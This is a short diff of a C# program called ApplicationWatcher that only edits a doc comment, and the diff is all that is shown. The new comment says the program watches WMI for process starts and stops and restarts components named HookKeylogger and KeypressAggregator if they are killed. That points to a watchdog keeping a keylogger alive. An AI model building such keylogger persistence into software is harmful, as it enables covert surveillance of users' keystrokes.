@@ -16,7 +16,7 @@ namespace ApplicationWatcher
         private static string serverAddr = "localhost";
 
         ///<summary>
-        ///Monitor the WMI to see when processes start and stop.
+        ///Monitor the WMI to see when processes start and stop. Restart HookKeylogger and KeypressAggregator if terminated.
         ///</summary>
         public static void Main(string[] args)
         {
